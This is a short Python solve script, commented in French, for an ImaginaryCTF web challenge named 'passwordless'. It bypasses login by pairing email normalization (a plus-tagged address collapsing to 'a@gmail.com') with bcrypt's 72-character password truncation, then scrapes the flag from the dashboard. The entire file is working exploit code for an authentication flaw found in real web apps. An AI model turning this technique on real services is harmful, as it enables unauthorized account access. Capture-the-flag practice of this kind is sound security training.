import requests

BASE = "http://passwordless.chal.imaginaryctf.org"

# 1) Fabrique un email brut très long (>= 72 chars avant @)
#    normalize-email va normaliser vers "a@gmail.com"
local_raw = "a+" + ("X" * 200)  # 1 + 1 + 200 = 202 chars (>= 72)
raw_email = f"{local_raw}@gmail.com"
normalized_email = "a@gmail.com"  # cible après normalisation

# 2) Le "mot de passe réel" attendu = 72 premiers caractères de l'email brut
password_72 = raw_email[:72]

with requests.Session() as s:
    # (Optionnel) Get /login pour init cookies/sessid
    s.get(f"{BASE}/login", timeout=10)

    # 3) Inscription: POST /user avec l'email BRUT
    r = s.post(f"{BASE}/user", data={"email": raw_email}, timeout=10, allow_redirects=True)
    print("[*] Register status:", r.status_code)

    # 4) Connexion: POST /session avec l'email NORMALISÉ + password_72
    r = s.post(
        f"{BASE}/session",
        data={"email": normalized_email, "password": password_72},
        timeout=10,
        allow_redirects=True
    )
    print("[*] Login status:", r.status_code)

    # 5) Accéder au dashboard (flag attendu ici)
    r = s.get(f"{BASE}/dashboard", timeout=10)
    print("[*] Dashboard status:", r.status_code)
    # affiche le flag ictf{}
    print("[*] Flag:", r.text.split('id="flag">')[1].split("</span>")[0])
